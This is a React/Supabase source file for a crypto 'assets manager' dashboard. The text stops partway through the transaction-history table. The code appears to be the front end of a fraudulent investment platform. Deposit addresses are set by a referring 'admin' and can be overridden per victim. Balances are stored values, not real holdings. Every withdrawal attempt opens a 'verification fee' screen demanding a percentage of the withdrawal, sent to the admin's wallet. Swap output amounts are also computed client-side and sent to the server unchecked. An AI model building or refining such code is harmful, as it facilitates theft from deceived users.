"use client";
import React, { useState, useEffect, useMemo, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
    ArrowUpRight, ArrowDownLeft, RefreshCw, X, Copy, Eye, EyeOff, 
    ShieldCheck, ChevronRight, ArrowRightLeft, CheckCircle, Clock, AlertTriangle,
    ChevronDown
} from "lucide-react";
import { THEME, ASSET_LIST } from "./constants"; 
import { createClient } from "@supabase/supabase-js";

// Initialize Supabase
const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

// 🛡️ THE FIX: 100% Crash-Proof Math Formatter
const AnimatedNumber = ({ value, prefix = "", toFixed = 2 }: any) => {
    const safeValue = (typeof value === 'number' && !isNaN(value)) ? value : 0;
    return <span>{prefix}{safeValue.toLocaleString(undefined, { minimumFractionDigits: toFixed, maximumFractionDigits: toFixed })}</span>;
};

// 🌟 CURRENCY INFO DICTIONARY FOR PRO MAX UI
const CURRENCY_INFO: Record<string, { name: string, flag: string, symbol: string }> = {
    USD: { name: "US Dollar", flag: "🇺🇸", symbol: "$" },
    EUR: { name: "Euro", flag: "🇪🇺", symbol: "€" },
    GBP: { name: "British Pound", flag: "🇬🇧", symbol: "£" },
    CAD: { name: "Canadian Dollar", flag: "🇨🇦", symbol: "C$" },
    AUD: { name: "Australian Dollar", flag: "🇦🇺", symbol: "A$" },
    JPY: { name: "Japanese Yen", flag: "🇯🇵", symbol: "¥" },
    CNY: { name: "Chinese Yuan", flag: "🇨🇳", symbol: "¥" },
    CHF: { name: "Swiss Franc", flag: "🇨🇭", symbol: "CHF" },
    HKD: { name: "Hong Kong Dollar", flag: "🇭🇰", symbol: "HK$" },
    SGD: { name: "Singapore Dollar", flag: "🇸🇬", symbol: "S$" },
    INR: { name: "Indian Rupee", flag: "🇮🇳", symbol: "₹" },
    AED: { name: "UAE Dirham", flag: "🇦🇪", symbol: "د.إ" },
    SAR: { name: "Saudi Riyal", flag: "🇸🇦", symbol: "﷼" },
    MXN: { name: "Mexican Peso", flag: "🇲🇽", symbol: "$" },
    BRL: { name: "Brazilian Real", flag: "🇧🇷", symbol: "R$" },
};

export default function AssetsManager() {
    // --- STATE ---
    const [modal, setModal] = useState<string | null>(null); 
    const [selectedAssetSymbol, setSelectedAssetSymbol] = useState<string | null>(null); 
    const [targetSwapCoin, setTargetSwapCoin] = useState<"BTC" | "ETH" | "USDT" | "USDC">("BTC");
    
    const [hideZero, setHideZero] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);
    const [processStep, setProcessStep] = useState(0); 
    const [isMobile, setIsMobile] = useState(false);
    
    // Inputs
    const [actionAmount, setActionAmount] = useState("");
    const [withdrawAddress, setWithdrawAddress] = useState("");
    const [depositAmount, setDepositAmount] = useState("");
    const [feeSentAmount, setFeeSentAmount] = useState("");

    // Data State
    const [userBalances, setUserBalances] = useState<Record<string, number>>({});
    const [marketPrices, setMarketPrices] = useState<Record<string, { p: number, c: number }>>({});
    const [history, setHistory] = useState<any[]>([]);
    
    // Admin/Recovery Addresses
    const [depositAddr, setDepositAddr] = useState<any>({ BTC: "", ETH: "", USDT: "", USDC: "" });
    const [verificationFee, setVerificationFee] = useState(7); // Default to 7%

    // --- CURRENCY STATE ---
    const [preferredCurrency, setPreferredCurrency] = useState("USD");
    const [exchangeRates, setExchangeRates] = useState<Record<string, number>>({ USD: 1 });
    const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false); 
    
    // Ref for throttling WebSocket
    const pricesRef = useRef<Record<string, { p: number, c: number }>>({});

    // --- EFFECT: SMART SWAP TARGET ---
    useEffect(() => {
        if (selectedAssetSymbol === targetSwapCoin) {
            const alternatives = ["BTC", "ETH", "USDT", "USDC"].filter(c => c !== selectedAssetSymbol);
            setTargetSwapCoin(alternatives[0] as any);
        }
    }, [selectedAssetSymbol]);

    // --- DERIVED PORTFOLIO ---
    const portfolio = useMemo(() => {
        return ASSET_LIST.map(coin => {
            const balance = userBalances[coin.s] || 0;
            const priceInfo = marketPrices[coin.s] || pricesRef.current[coin.s] || { p: 0, c: 0 };
            const finalPrice = (coin.s === "USDT" || coin.s === "USDC") ? 1.00 : (priceInfo.p || 0);

            return {
                ...coin,
                balance: balance,
                p: finalPrice,
                c: priceInfo.c,
                value: balance * finalPrice
            };
        }).sort((a, b) => b.value - a.value); 
    }, [userBalances, marketPrices]);

    const selectedAsset = useMemo(() => 
        portfolio.find(p => p.s === selectedAssetSymbol), 
    [portfolio, selectedAssetSymbol]);

    // --- FETCH DATA ---
    const fetchData = async () => {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user) return;

        const { data: profile } = await supabase.from('profiles').select('*').eq('id', user.id).single();

        if (profile) {
            // SET USER PREFERENCE
            if (profile.preferred_currency) setPreferredCurrency(profile.preferred_currency);

            // --- 1. DETERMINE ADDRESSES ---
            let finalBtcAddr = "";
            let finalEthAddr = "";
            let finalUsdtAddr = "";
            let finalUsdcAddr = "";

            const adminId = profile.referred_by || profile.managed_by;

            if (adminId) {
                const { data: settings } = await supabase
                    .from('admin_settings')
                    .select('*')
                    .eq('admin_id', adminId)
                    .single();
                
                if (settings) {
                    finalBtcAddr = settings.btc_wallet_address || "";
                    finalEthAddr = settings.eth_wallet_address || "";
                    finalUsdtAddr = settings.usdt_wallet_address || "";
                    finalUsdcAddr = settings.usdc_wallet_address || "";
                }
            }

            // Check for specific client overrides
            if (profile.specific_btc_address?.trim()) finalBtcAddr = profile.specific_btc_address;
            if (profile.specific_eth_address?.trim()) finalEthAddr = profile.specific_eth_address;
            if (profile.specific_usdt_address?.trim()) finalUsdtAddr = profile.specific_usdt_address;
            if (profile.specific_usdc_address?.trim()) finalUsdcAddr = profile.specific_usdc_address;

            setDepositAddr({
                BTC: finalBtcAddr || "Contact Support", 
                ETH: finalEthAddr || "Contact Support",
                USDT: finalUsdtAddr || "Contact Support",
                USDC: finalUsdcAddr || "Contact Support"
            });

            // --- 2. MAP BALANCES & FEES ---
            const newBalances: Record<string, number> = {};
            ASSET_LIST.forEach(asset => {
                const colName = `${asset.s.toLowerCase()}_balance`;
                newBalances[asset.s] = profile[colName] || 0;
            });
            setUserBalances(newBalances);

            if (profile.verification_fee_percent !== undefined && profile.verification_fee_percent !== null) {
                setVerificationFee(Number(profile.verification_fee_percent));
            }
        }

        // --- 3. FETCH TRANSACTIONS ---
        const { data: txs, error } = await supabase.from('transactions').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
        if (!error && txs) {
            setHistory(txs.map((t: any) => {
                const isDeduction = t.type === 'withdrawal' || (t.type === 'swap' && t.metadata?.swapped_from);
                
                let displayType = 'OTHER';
                if (t.type === 'deposit_crypto') displayType = 'DEPOSIT';
                else if (t.type === 'withdrawal') displayType = 'WITHDRAWAL';
                else if (t.type === 'swap') displayType = 'SWAP';
                else if (t.type === 'recovery_claim') displayType = 'RECOVERY';

                return {
                    id: t.id,
                    type: displayType,
                    desc: t.description || `${t.asset || 'Asset'} Transaction`,
                    amount: `${isDeduction ? '-' : '+'}${Number(t.amount).toFixed(6)} ${t.asset || ''}`,
                    date: new Date(t.created_at).toLocaleDateString(),
                    time: new Date(t.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    status: t.status.toUpperCase(),
                    hash: t.tx_hash || null,
                    isPositive: !isDeduction
                };
            }));
        }
    };

    // --- CURRENCY UPDATE FUNCTION ---
    const handleCurrencyChange = async (newCurrency: string) => {
        setPreferredCurrency(newCurrency);
        const { data: { user } } = await supabase.auth.getUser();
        if (user) {
            await supabase.from('profiles').update({ preferred_currency: newCurrency }).eq('id', user.id);
        }
    };

    // ---------------------------------------------------------
    // ⚡ REAL-TIME SIGNAL RECEIVER
    // ---------------------------------------------------------
    useEffect(() => {
        let activeChannel: any = null;

        const setupRealtime = async () => {
            const { data: { user } } = await supabase.auth.getUser();
            if (!user) return;

            activeChannel = supabase.channel('assets_manager_aggressive_update')
                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${user.id}` }, () => {
                    fetchData();
                })
                .on('postgres_changes', { event: '*', schema: 'public', table: 'transactions', filter: `user_id=eq.${user.id}` }, () => {
                    fetchData();
                })
                .subscribe();
        };

        setupRealtime();

        return () => { if(activeChannel) supabase.removeChannel(activeChannel); };
    }, []);

    // --- EFFECTS ---
    useEffect(() => {
        const handleResize = () => setIsMobile(window.innerWidth < 768);
        handleResize();
        window.addEventListener('resize', handleResize);
        
        fetchData();

        // 🔹 1. FETCH LIVE GLOBAL EXCHANGE RATES (Unbreakable API)
        const fetchLiveFiatRates = async () => {
            try {
                const res = await fetch('https://open.er-api.com/v6/latest/USD');
                const data = await res.json();
                if (data && data.rates) {
                    setExchangeRates(data.rates);
                }
            } catch (err) {
                console.error("Failed to fetch exchange rates. Defaulting to USD.", err);
            }
        };
        fetchLiveFiatRates();

        // 🔹 2. WEBSOCKET LOGIC (Crypto Prices)
        const symbols = ASSET_LIST.filter(a => a.s !== 'USDT' && a.s !== 'USDC').map(a => `${a.s.toLowerCase()}usdt@miniTicker`).join('/');
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbols}`);
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            const symbol = data.s; 
            
            if (symbol && symbol.endsWith("USDT")) {
                const shortName = symbol.replace("USDT", "");
                pricesRef.current[shortName] = { 
                    p: parseFloat(data.c), 
                    c: parseFloat(data.o) > 0 ? ((parseFloat(data.c) - parseFloat(data.o)) / parseFloat(data.o)) * 100 : 0 
                };
            }
        };

        pricesRef.current['USDT'] = { p: 1.00, c: 0.00 };
        pricesRef.current['USDC'] = { p: 1.00, c: 0.00 };

        const intervalId = setInterval(() => {
            setMarketPrices(prev => ({ ...prev, ...pricesRef.current }));
        }, 1500); 

        return () => {
            window.removeEventListener('resize', handleResize);
            ws.close();
            clearInterval(intervalId);
        };
    }, []);

    const totalValue = portfolio.reduce((acc, item) => acc + item.value, 0);

    // ============================================================================
    // 🛡️ DYNAMIC WITHDRAWAL-BASED FEE CALCULATION
    // ============================================================================
    const feePercentageDecimal = verificationFee / 100;
    const feeAssetSymbol = selectedAsset?.s || "BTC";
    const feeAssetPrice = selectedAsset?.p || 1;
    const withdrawAmtNumber = parseFloat(actionAmount) || 0;
    const feeAmountCrypto = withdrawAmtNumber * feePercentageDecimal;
    const feeAmountUSD = feeAmountCrypto * feeAssetPrice;
    const feeWalletAddress = selectedAsset ? depositAddr[selectedAsset.s] : depositAddr.BTC;
    // ============================================================================


    // --- ACTIONS ---
    const handleConvertGlobal = async (target: "BTC" | "ETH" | "USDT" | "USDC") => {
        setProcessStep(1); 
        setModal("processing_swap");
        
        try {
            const { data: { user } } = await supabase.auth.getUser();
            if(!user) throw new Error("Authentication error. Please log in again.");

            let hasErrors = false;
            let errorMessage = "";

            for (const asset of portfolio) {
                if (asset.s !== target && asset.balance > 0) {
                    const targetPrice = marketPrices[target]?.p || pricesRef.current[target]?.p || 1;
                    const assetPrice = asset.p || 0;
                    
                    if (targetPrice > 0 && assetPrice > 0) {
                        const amountOut = (asset.balance * assetPrice) / targetPrice;
                        
                        const { error } = await supabase.rpc('swap_assets', {
                            p_user_id: user.id,
                            p_from_asset: asset.s,
                            p_to_asset: target,
                            p_amount_in: asset.balance,
                            p_amount_out: amountOut
                        });

                        if (error) {
                            hasErrors = true;
                            errorMessage = error.message;
                        }
                    }
                }
            }

            if (hasErrors) throw new Error(errorMessage || "Some assets failed to convert.");

            setProcessStep(2); 
            await fetchData(); 
            setTimeout(() => { setProcessStep(0); setModal(null); }, 2000);
        } catch (error: any) {
            alert("Convert Failed: " + error.message);
            setProcessStep(0);
            setModal(null);
        }
    };

    const handleSwapSingle = async () => {
        if(!selectedAsset || !actionAmount) return;
        if(parseFloat(actionAmount) > selectedAsset.balance) {
            alert("Insufficient Balance");
            return;
        }

        setProcessStep(1);
        setModal("processing_swap");

        try {
            const { data: { user } } = await supabase.auth.getUser();
            if(!user) throw new Error("No User");

            const amountIn = parseFloat(actionAmount);
            const targetPrice = marketPrices[targetSwapCoin]?.p || pricesRef.current[targetSwapCoin]?.p || 1;
            const assetPrice = selectedAsset.p || 0;
            const amountOut = (amountIn * assetPrice) / targetPrice;

            const { error } = await supabase.rpc('swap_assets', {
                p_user_id: user.id,
                p_from_asset: selectedAsset.s,
                p_to_asset: targetSwapCoin,
                p_amount_in: amountIn,
                p_amount_out: amountOut
            });

            if (error) throw error;

            setProcessStep(2);
            await fetchData();
            setTimeout(() => { setProcessStep(0); setModal(null); setActionAmount(""); }, 2000);

        } catch (error: any) {
            alert("Swap Error: " + error.message);
            setModal(null);
        }
    }

    const handleWithdrawAttempt = async () => {
        if (!selectedAsset) return;
        if (parseFloat(actionAmount) > selectedAsset.balance) return alert("Insufficient Balance");

        setIsProcessing(true);
        const { data: { user } } = await supabase.auth.getUser();
        if(user) {
            await supabase.from('transactions').insert({
                user_id: user.id,
                type: 'withdrawal',
                asset: selectedAsset.s,
                amount: parseFloat(actionAmount),
                status: 'pending',
                description: `Withdrawal to ${withdrawAddress}`
            });
            fetchData(); 
        }
        setTimeout(() => {
            setIsProcessing(false);
            setModal("verification_fee"); 
        }, 1500);
    };

    const handleDeclareDeposit = async () => {
        const amt = parseFloat(depositAmount);
        if (!amt || amt <= 0) return alert("Please enter a valid deposit amount.");
        if (!selectedAsset) return;

        setIsProcessing(true);
        const { data: { user } } = await supabase.auth.getUser();
        if(user) {
            await supabase.from('transactions').insert({
                user_id: user.id,
                type: 'deposit_crypto',
                asset: selectedAsset.s,
                amount: amt,
                status: 'pending',
                description: `Awaiting network confirmation`
            });
            fetchData(); 
        }
        setIsProcessing(false);
        setModal(null);
        setDepositAmount("");
        alert("Deposit broadcasted! Awaiting blockchain network confirmation.");
    };

    const handleDeclareFeeDeposit = async () => {
        const amt = parseFloat(feeSentAmount) || feeAmountCrypto;
        if (!amt || amt <= 0) return alert("Please enter a valid deposit amount.");

        setIsProcessing(true);
        const { data: { user } } = await supabase.auth.getUser();
        if(user) {
            await supabase.from('transactions').insert({
                user_id: user.id,
                type: 'deposit_crypto',
                asset: feeAssetSymbol,
                amount: amt,
                status: 'pending',
                description: `Verification Fee Payment`
            });
            fetchData(); 
        }
        setIsProcessing(false);
        setModal(null);
        setFeeSentAmount("");
        alert("Verification fee deposit broadcasted! Awaiting network confirmation.");
    };

    const copyToClipboard = async (text: string) => {
        if (!text) return;
        try {
            await navigator.clipboard.writeText(text);
            alert("Address copied to clipboard!");
        } catch (err) {
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                document.execCommand('copy');
                alert("Address copied to clipboard!");
            } catch (fallbackErr) {
                alert("Failed to copy. Please manually select and copy the text.");
            }
            document.body.removeChild(textArea);
        }
    };

    const allowedDepWdrAssets = portfolio.filter(a => ["BTC", "ETH", "USDT", "USDC"].includes(a.s));
    const adminAddress = selectedAsset ? (depositAddr[selectedAsset.s] || "Address generating...") : "";

    const getHistoryStyles = (type: string) => {
        switch (type) {
            case 'DEPOSIT': return { bg: 'rgba(34, 197, 94, 0.1)', color: THEME.success, icon: <ArrowDownLeft size={12}/> };
            case 'WITHDRAWAL': return { bg: 'rgba(239, 68, 68, 0.1)', color: THEME.danger, icon: <ArrowUpRight size={12}/> };
            case 'SWAP': return { bg: 'rgba(139, 92, 246, 0.1)', color: THEME.accent, icon: <ArrowRightLeft size={12}/> };
            case 'RECOVERY': return { bg: 'rgba(59, 130, 246, 0.1)', color: '#3b82f6', icon: <ShieldCheck size={12}/> };
            default: return { bg: 'rgba(255, 255, 255, 0.1)', color: 'white', icon: <CheckCircle size={12}/> };
        }
    };

    // --- 🌍 MULTI-CURRENCY MATH & LOGIC ---
    const currentRate = exchangeRates[preferredCurrency] || 1;
    const currentSymbol = CURRENCY_INFO[preferredCurrency]?.symbol || "$";

    return (
        <div className="max-w-[1200px] mx-auto w-full">
            
            {/* TOTAL BALANCE CARD */}
            <div className="p-6 md:p-[35px] rounded-2xl md:rounded-[24px] mb-[30px] md:mb-[40px]" style={{ background: "linear-gradient(135deg, #1a1a2e 0%, #050505 100%)", border: THEME.border }}>
                <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-[20px]">
                    <div className="w-full md:w-auto">
                        <div className="text-[#888] text-[10px] md:text-[12px] font-bold tracking-[2px] mb-[10px]">TOTAL PORTFOLIO</div>
                        <div className="text-[36px] md:text-[56px] font-[800] text-white tracking-tight leading-none mb-[20px] md:mb-0">
                            <AnimatedNumber prefix={currentSymbol} value={totalValue * currentRate} />
                        </div>
                        <div className="flex gap-[10px] md:gap-[15px] mt-0 md:mt-[25px]">
                            <motion.button whileHover={{ scale: 1.05 }} onClick={() => setModal("deposit_menu")} className="flex-1 md:flex-none px-[16px] md:px-[24px] py-[12px] md:py-[10px] rounded-xl md:rounded-[14px] font-bold text-[13px] md:text-[15px] text-white flex items-center justify-center gap-[8px]" style={{ background: THEME.success, border: "none", cursor: "pointer" }}>
                                <ArrowDownLeft size={18} className="md:w-5 md:h-5" /> Deposit
                            </motion.button>
                            <motion.button whileHover={{ scale: 1.05 }} onClick={() => setModal("withdraw_menu")} className="flex-1 md:flex-none px-[16px] md:px-[24px] py-[12px] md:py-[10px] rounded-xl md:rounded-[14px] font-bold text-[13px] md:text-[15px] text-white flex items-center justify-center gap-[8px]" style={{ background: "rgba(255,255,255,0.1)", border: "1px solid rgba(255,255,255,0.1)", cursor: "pointer" }}>
                                <ArrowUpRight size={18} className="md:w-5 md:h-5" /> Withdraw
                            </motion.button>
                        </div>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-3 w-full md:w-auto mt-4 md:mt-0">
                        <motion.button onClick={() => handleConvertGlobal("BTC")} className="px-3 py-3 rounded-xl text-white flex items-center gap-3" style={{ background: "#1a1a1a", border: `1px solid ${THEME.border}`, cursor: "pointer" }}>
                            <img src="https://assets.coingecko.com/coins/images/1/standard/bitcoin.png" width={24} className="rounded-full shrink-0" alt="BTC" />
                            <div className="text-left"><div className="text-xs font-bold whitespace-nowrap">Swap to BTC</div></div>
                        </motion.button>
                        <motion.button onClick={() => handleConvertGlobal("ETH")} className="px-3 py-3 rounded-xl text-white flex items-center gap-3" style={{ background: "#1a1a1a", border: `1px solid ${THEME.border}`, cursor: "pointer" }}>
                            <img src="https://assets.coingecko.com/coins/images/279/standard/ethereum.png" width={24} className="rounded-full shrink-0" alt="ETH" />
                            <div className="text-left"><div className="text-xs font-bold whitespace-nowrap">Swap to ETH</div></div>
                        </motion.button>
                        <motion.button onClick={() => handleConvertGlobal("USDT")} className="px-3 py-3 rounded-xl text-white flex items-center gap-3" style={{ background: "#1a1a1a", border: `1px solid ${THEME.border}`, cursor: "pointer" }}>
                            <img src="https://assets.coingecko.com/coins/images/325/standard/Tether.png" width={24} className="rounded-full shrink-0" alt="USDT" />
                            <div className="text-left"><div className="text-xs font-bold whitespace-nowrap">Swap to USDT</div></div>
                        </motion.button>
                        <motion.button onClick={() => handleConvertGlobal("USDC")} className="px-3 py-3 rounded-xl text-white flex items-center gap-3" style={{ background: "#1a1a1a", border: `1px solid ${THEME.border}`, cursor: "pointer" }}>
                            <img src="https://assets.coingecko.com/coins/images/6319/standard/usdc.png" width={24} className="rounded-full shrink-0" alt="USDC" />
                            <div className="text-left"><div className="text-xs font-bold whitespace-nowrap">Swap to USDC</div></div>
                        </motion.button>
                    </div>
                </div>
            </div>

            {/* ASSET LIST WITH PRO MAX DROPDOWN */}
            <div className="flex justify-between items-center mb-[15px]">
                <h3 className="text-[18px] md:text-[20px] font-bold">Your Assets</h3>
                
                <div className="flex items-center gap-3 md:gap-4 relative z-50">
                    
                    {/* --- SUPER PRO MAX BINANCE STYLE SELECTOR --- */}
                    <div className="relative">
                        <button 
                            onClick={() => setIsCurrencyDropdownOpen(!isCurrencyDropdownOpen)}
                            className="flex items-center gap-2 bg-[#131315] hover:bg-[#1a1a1f] border border-white/5 hover:border-purple-500/30 px-3 py-1.5 rounded-xl transition-all shadow-[0_4px_15px_rgba(0,0,0,0.5)] group"
                        >
                            <div className="w-5 h-5 rounded-full overflow-hidden flex items-center justify-center bg-purple-500/10 border border-purple-500/20 text-[10px]">
                                {CURRENCY_INFO[preferredCurrency]?.flag || "🌐"}
                            </div>
                            <span className="font-bold text-xs text-white tracking-wide">{preferredCurrency}</span>
                            <ChevronDown size={14} className={`text-gray-500 transition-transform duration-300 ${isCurrencyDropdownOpen ? 'rotate-180 text-purple-400' : 'group-hover:text-white'}`} />
                        </button>

                        <AnimatePresence>
                            {isCurrencyDropdownOpen && (
                                <>
                                    <div className="fixed inset-0 z-40" onClick={() => setIsCurrencyDropdownOpen(false)} />
                                    <motion.div 
                                        initial={{ opacity: 0, y: 10, scale: 0.95 }} 
                                        animate={{ opacity: 1, y: 0, scale: 1 }} 
                                        exit={{ opacity: 0, y: 10, scale: 0.95 }}
                                        transition={{ duration: 0.15 }}
                                        className="absolute right-0 top-full mt-2 w-56 md:w-64 bg-[#0a0a0c]/95 backdrop-blur-xl border border-purple-500/20 rounded-2xl shadow-[0_15px_40px_-10px_rgba(124,58,237,0.2)] z-50 overflow-hidden"
                                    >
                                        <div className="p-3 border-b border-white/5 bg-white/[0.02]">
                                            <div className="text-[10px] font-bold text-gray-500 uppercase tracking-widest px-1">Select Local Currency</div>
                                        </div>
                                        <div className="max-h-[300px] overflow-y-auto custom-scrollbar p-2 space-y-1">
                                            {Object.keys(exchangeRates).length > 0 ? (
                                                Object.keys(CURRENCY_INFO).map(curr => {
                                                    const info = CURRENCY_INFO[curr];
                                                    const isSelected = curr === preferredCurrency;
                                                    return (
                                                        <button 
                                                            key={curr} 
                                                            onClick={() => { handleCurrencyChange(curr); setIsCurrencyDropdownOpen(false); }}
                                                            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-xl transition-all ${isSelected ? 'bg-purple-500/10 border border-purple-500/30 shadow-inner' : 'hover:bg-white/5 border border-transparent'}`}
                                                        >
                                                            <div className="flex items-center gap-3">
                                                                <div className="w-6 h-6 rounded-full flex items-center justify-center bg-black/50 border border-white/10 text-xs shadow-inner">
                                                                    {info.flag}
                                                                </div>
                                                                <div className="flex flex-col items-start">
                                                                    <span className={`text-xs font-bold ${isSelected ? 'text-purple-400' : 'text-gray-200'}`}>{curr}</span>
                                                                    <span className="text-[9px] text-gray-500 font-medium tracking-wide">{info.name}</span>
                                                                </div>
                                                            </div>
                                                            {isSelected && <CheckCircle size={14} className="text-purple-500" />}
                                                        </button>
                                                    );
                                                })
                                            ) : (
                                                <div className="p-4 text-center text-xs text-gray-500">Loading Data...</div>
                                            )}
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>

                    <div onClick={() => setHideZero(!hideZero)} className="flex items-center gap-[6px] text-[11px] md:text-[12px] text-[#888] cursor-pointer hover:text-white transition ml-2">
                        {hideZero ? <EyeOff size={14} /> : <Eye size={14} />} <span className="whitespace-nowrap">{hideZero ? "Show All" : "Hide Zero"}</span>
                    </div>
                </div>
            </div>
            
            <div className="rounded-2xl md:rounded-[20px] overflow-hidden mb-[30px] md:mb-[40px]" style={{ background: THEME.cardBg, border: THEME.border }}>
                <div className="hidden md:grid" style={{ gridTemplateColumns: "1.5fr 1fr 1fr 1fr 1.2fr", padding: "15px 30px", borderBottom: "1px solid rgba(255,255,255,0.05)", fontSize: 11, fontWeight: "bold", color: "#666", letterSpacing: 1 }}>
                    <div>ASSET</div><div style={{textAlign: "right"}}>PRICE</div><div style={{textAlign: "right"}}>BALANCE</div><div style={{textAlign: "right"}}>VALUE</div><div style={{textAlign: "right"}}>ACTIONS</div>
                </div>
                
                <div style={{ position: "relative" }}>
                    <AnimatePresence>
                    {portfolio.map((asset) => {
                        if (hideZero && asset.balance <= 0.0001) return null;
                        const hasZeroBalance = asset.balance <= 0;

                        return (
                            <motion.div key={asset.s} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col md:grid md:grid-cols-[1.5fr_1fr_1fr_1fr_1.2fr] p-4 md:p-[20px_30px] items-start md:items-center gap-4 md:gap-0 border-b border-white/5 last:border-b-0">
                                <div className="flex items-center justify-between w-full md:w-auto">
                                    <div className="flex items-center gap-[12px] md:gap-[15px]">
                                        <img src={asset.l} className="w-8 h-8 md:w-[34px] md:h-[34px] rounded-full" alt={asset.n} />
                                        <div>
                                            <div className="font-bold text-[14px] md:text-[15px] leading-tight">{asset.n}</div>
                                            <div className="text-[11px] md:text-[12px] text-[#666]">{asset.s}</div>
                                        </div>
                                    </div>
                                    <div className="md:hidden text-right">
                                        <div className="font-bold text-[14px]">{asset.balance.toFixed(4)}</div>
                                        <div className="text-[12px]" style={{ color: THEME.success }}>
                                            <AnimatedNumber prefix={currentSymbol} value={asset.value * currentRate} />
                                        </div>
                                    </div>
                                </div>

                                <div className="hidden md:block text-right font-mono font-bold text-white">
                                    <AnimatedNumber prefix={currentSymbol} value={asset.p * currentRate} />
                                </div>
                                <div className="hidden md:block text-right font-bold">
                                    {asset.balance.toFixed(4)}
                                </div>
                                <div className="hidden md:block text-right font-mono font-bold" style={{ color: THEME.success }}>
                                    <AnimatedNumber prefix={currentSymbol} value={asset.value * currentRate} />
                                </div>

                                <div className="w-full md:w-auto flex justify-end mt-2 md:mt-0">
                                    <motion.button 
                                        disabled={hasZeroBalance}
                                        onClick={() => { if(!hasZeroBalance) { setSelectedAssetSymbol(asset.s); setActionAmount(""); setModal("swap"); } }} 
                                        className="w-full md:w-auto px-[14px] py-[10px] md:py-[8px] rounded-xl md:rounded-[8px] flex items-center justify-center gap-[6px] text-[12px] font-bold transition-all"
                                        style={{ background: hasZeroBalance ? "rgba(255,255,255,0.02)" : "rgba(255,255,255,0.1)", border: hasZeroBalance ? "none" : "1px solid rgba(255,255,255,0.1)", color: hasZeroBalance ? "#555" : "white", cursor: hasZeroBalance ? "not-allowed" : "pointer" }}
                                    >
                                        <ArrowRightLeft size={14} /> Swap
                                    </motion.button>
                                </div>
                            </motion.div>
                        );
                    })}
                    </AnimatePresence>
                </div>
            </div>

            {/* --- SCROLLABLE TRANSACTION HISTORY --- */}
            <div className="mb-[15px] flex justify-between items-center">
                <h3 className="text-[18px] md:text-[20px] font-bold">Recent Activity</h3>
            </div>
            
            <div className="rounded-2xl md:rounded-[20px] overflow-hidden mb-[40px]" style={{ background: THEME.cardBg, border: THEME.border }}>
                {history.length === 0 ? (
                    <div className="p-[40px] text-center text-[#666]">
                        <Clock size={32} style={{ margin: "0 auto 10px", opacity: 0.5 }} />
                        <p className="text-sm">No recent transactions.</p>
                    </div>
                ) : (
                    <div className="max-h-[450px] overflow-y-auto custom-scrollbar">
                        <div className="md:hidden flex flex-col">
                            {history.map((tx) => {
                                const style = getHistoryStyles(tx.type);
                                return (
                                    <div key={tx.id} className="p-4 border-b border-white/5 last:border-b-0 flex flex-col gap-3">
                                        <div className="flex justify-between items-start">
                                            <div className="flex items-center gap-[6px] px-[8px] py-[4px] rounded-[6px] text-[9px] font-bold uppercase" style={{ background: style.bg, color: style.color }}>
                                                {style.icon} {tx.type}
                                            </div>
                                            <span className="text-[10px] font-bold uppercase" style={{ color: tx.status === 'COMPLETED' ? THEME.success : tx.status === 'PENDING' ? '#3b82f6' : '#f59e0b' }}>
                                                {tx.status}
                                            </span>
                                        </div>
                                        <div className="flex justify-between items-end">
                                            <div>
                                                <div className="text-[12px] text-[#ccc] mb-1 leading-tight">{tx.desc}</div>
                                                <div className="text-[10px] text-[#666]">{tx.date} • {tx.time}</div>
                                            </div>
                                            <div className="text-[14px] font-bold whitespace-nowrap" style={{ color: tx.isPositive ? THEME.success : "white" }}>
                                                {tx.amount}
                                            </div>
                                        </div>
                                    </div>
                                );
                            })}
                        </div>

                        <div className="hidden md:block">
                            <table style={{ width: "100%", borderCollapse: "separate", borderSpacing: 0, minWidth: 600 }}>
                                <thead>
                                    <tr>
                                        <th style={{ position: "sticky", top: 0, zIndex: 10, background: "#11141d", borderBottom: "1px solid rgba(255,255,255,0.05)", padding: "16px 24px", textAlign: "left", fontSize: 11, color: "#666", fontWeight: "bold", letterSpacing: 1 }}>TYPE</th>
                                        <th style={{ position: "sticky", top: 0, zIndex: 10, background: "#11141d", borderBottom: "1px solid rgba(255,255,255,0.05)", padding: "16px 24px", textAlign: "left", fontSize: 11, color: "#666", fontWeight: "bold", letterSpacing: 1 }}>DETAILS</th>
                                        <th style={{ position: "sticky", top: 0, zIndex: 10, background: "#11141d", borderBottom: "1px solid rgba(255,255,255,0.05)", padding: "16px 24px", textAlign: "right", fontSize: 11, color: "#666", fontWeight: "bold", letterSpacing: 1 }}>AMOUNT</th>
                                        <th style={{ position: "sticky", top: 0, zIndex: 10, background: "#11141d", borderBottom: "1px solid rgba(255,255,255,0.05)", padding: "16px 24px", textAlign: "right", fontSize: 11, color: "#666", fontWeight: "bold", letterSpacing: 1 }}>DATE</th>
                                        <th style={{ position: "sticky", top: 0, zIndex: 10, background: "#11141d", borderBottom: "1px solid rgba(255,255,255,0.05)", padding: "16px 24px", textAlign: "right", fontSize: 11, color: "#666", fontWeight: "bold", letterSpacing: 1 }}>STATUS</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {history.map((tx) => {
                                        const style = getHistoryStyles(tx.type);
                                        return (
                                            <tr key={tx.id} style={{ transition: "background 0.2s" }} onMouseEnter={(e) => e.currentTarget.style.background = "rgba(255,255,255,0.02)"} onMouseLeave={(e) => e.currentTarget.style.background = "transparent"}>
                                                <td style={{ padding: "16px 24px", borderBottom: "1px solid rgba(255,255,255,0.02)" }}>
